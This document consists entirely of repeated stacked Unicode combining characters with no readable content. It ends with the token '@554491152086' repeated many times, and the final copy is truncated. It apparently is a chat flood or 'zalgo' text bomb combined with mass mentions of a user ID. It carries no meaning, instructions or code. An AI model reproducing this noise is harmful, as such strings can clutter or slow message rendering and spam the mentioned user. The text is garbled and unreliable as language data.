͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̈́͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̈́͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͛̽͛ @554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@5